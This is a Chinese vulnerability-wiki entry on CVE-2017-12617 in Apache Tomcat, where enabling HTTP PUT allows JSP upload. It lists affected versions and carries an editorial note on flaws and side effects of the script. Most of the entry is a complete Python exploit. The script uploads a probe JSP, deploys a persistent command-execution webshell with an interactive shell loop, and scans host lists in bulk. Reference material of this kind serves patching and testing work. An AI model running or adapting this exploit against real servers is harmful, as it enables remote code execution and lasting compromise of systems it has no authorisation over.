---
cve: "CVE-2017-12617"
title: "Apache Tomcat RCE via JSP Upload Bypass CVE-2017-12617"
product: "Apache Tomcat DefaultServlet"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2017-12617"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "PUT启用/readonly=false、可写Web目录且JSP可执行；列7/8.0/8.5/9相应历史范围"
source_status: "missing"
side_effects: "含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
id: "vw-ecfceae647e69e6dadbfabfd"
entity_id: "ve-ecfceae647e69e6dadbfabfd"
schema_version: "1"
---

# Apache Tomcat RCE via JSP Upload Bypass CVE-2017-12617

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：PUT启用/readonly=false、可写Web目录且JSP可执行；列7/8.0/8.5/9相应历史范围
- 证据范围：标题和范围较302正确，脚本区分检查/上传shell但检查本身落地JSP，绝非只读。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Python3 getContent返回bytes而用str in con会TypeError；交互str(bytes)显示b前缀而非解码
- 检查固定Poc.jsp可能覆盖已有文件，脚本无删除；pwn直接部署持久webshell
- usage -pwn错误长参数应--pwn，hosts拼hotsts
- URL拼接重复/且缺鉴权、timeout、网络错误处理，成功201只是创建不是执行证明
- 缺对应修复版本/恢复readonly建议；与12615需区分平台与修复阶段

### 操作风险与资料使用

- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

Apache Tomcat版本9.0.0.M1至9.0.0、8.5.0至8.5.22、8.0.0.RC1至8.0.46和7.0.0至7.0.81且启用HTTP PUT时（例如，通过设置只读如果将Default servlet的初始化参数设置为false，则可以通过特制请求将JSP文件上载到服务器。然后可以请求此JSP，并且服务器将执行其中包含的所有代码。

## 漏洞影响

```
Apache Tomcat版本9.0.0.M1至9.0.0
Apache Tomcat版本8.5.0至8.5.22
Apache Tomcat版本8.0.0.RC1至8.0.46
Apache Tomcat版本7.0.0至7.0.81
```

## 漏洞EXP

```python
#!/usr/bin/python
# From https://github.com/cyberheartmi9/CVE-2017-12617/blob/master/tomcat-cve-2017-12617.py
"""
./cve-2017-12617.py [options]


options:


-u ,--url [::] check target url if it's vulnerable
-p,--pwn [::] generate webshell and upload it
-l,--list [::] hosts list


[+]usage:


./cve-2017-12617.py -u http://127.0.0.1
./cve-2017-12617.py --url http://127.0.0.1
./cve-2017-12617.py -u http://127.0.0.1 -p pwn
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn
./cve-2017-12617.py -l hotsts.txt
./cve-2017-12617.py --list hosts.txt
"""
from __future__ import print_function
from builtins import input
from builtins import str
from builtins import object
import requests
import re
import signal
from optparse import OptionParser








class bcolors(object):
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'




banner="""


   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/



[@intx0x80]

"""





def signal_handler(signal, frame):

    print ("\033[91m"+"\n[-] Exiting"+"\033[0m")

    exit()

signal.signal(signal.SIGINT, signal_handler)




def removetags(tags):
    remove = re.compile('<.*?>')
    txt = re.sub(remove, '\n', tags)
    return txt.replace("\n\n\n","\n")


def getContent(url,f):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    re=requests.get(str(url)+"/"+str(f), headers=headers)
    return re.content

def createPayload(url,f):
    evil='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    req=requests.put(str(url)+str(f)+"/",data=evil, headers=headers)
    if req.status_code==201:
        print("File Created ..")


def RCE(url,f):
    EVIL="""<FORM METHOD=GET ACTION='{}'>""".format(f)+"""
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>"""



    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

    req=requests.put(str(url)+f+"/",data=EVIL, headers=headers)



def shell(url,f):

    while True:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        cmd=input("$ ")
        payload={'cmd':cmd}
        if cmd=="q" or cmd=="Q":
            break

        re=requests.get(str(url)+"/"+str(f),params=payload,headers=headers)
        re=str(re.content)
        t=removetags(re)
        print(t)





#print bcolors.HEADER+ banner+bcolors.ENDC

parse=OptionParser(


bcolors.HEADER+"""


   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/




./cve-2017-12617.py [options]

options:

-u ,--url [::] check target url if it's vulnerable
-p,--pwn  [::] generate webshell and upload it
-l,--list [::] hosts list

[+]usage:

./cve-2017-12617.py -u http://127.0.0.1
./cve-2017-12617.py --url http://127.0.0.1
./cve-2017-12617.py -u http://127.0.0.1 -p pwn
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn
./cve-2017-12617.py -l hotsts.txt
./cve-2017-12617.py --list hosts.txt


[@intx0x80]

"""+bcolors.ENDC

    )


parse.add_option("-u","--url",dest="U",type="string",help="Website Url")
parse.add_option("-p","--pwn",dest="P",type="string",help="generate webshell and upload it")
parse.add_option("-l","--list",dest="L",type="string",help="hosts File")

(opt,args)=parse.parse_args()

if opt.U==None and opt.P==None and opt.L==None:
    print(parse.usage)
    exit(0)



else:
    if opt.U!=None and opt.P==None and opt.L==None:
        print(bcolors.OKGREEN+banner+bcolors.ENDC)
        url=str(opt.U)
        checker="Poc.jsp"
        print(bcolors.BOLD +"Poc Filename  {}".format(checker))
        createPayload(str(url)+"/",checker)
        con=getContent(str(url)+"/",checker)
        if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
            print(bcolors.WARNING+url+' it\'s Vulnerable to CVE-2017-12617'+bcolors.ENDC)
            print(bcolors.WARNING+url+"/"+checker+bcolors.ENDC)

        else:
            print('Not Vulnerable to CVE-2017-12617 ')
    elif opt.P!=None and opt.U!=None and  opt.L==None:
        print(bcolors.OKGREEN+banner+bcolors.ENDC)
        pwn=str(opt.P)
        url=str(opt.U)
        print("Uploading Webshell .....")
        pwn=pwn+".jsp"
        RCE(str(url)+"/",pwn)
        shell(str(url),pwn)
    elif opt.L!=None and opt.P==None and opt.U==None:
        print(bcolors.OKGREEN+banner+bcolors.ENDC)
        w=str(opt.L)
        f=open(w,"r")
        print("Scaning hosts in {}".format(w))
        checker="Poc.jsp"
        for i in f.readlines():
            i=i.strip("\n")
            createPayload(str(i)+"/",checker)
            con=getContent(str(i)+"/",checker)
            if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
                print(str(i)+"\033[91m"+" [ Vulnerable ] ""\033[0m")
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
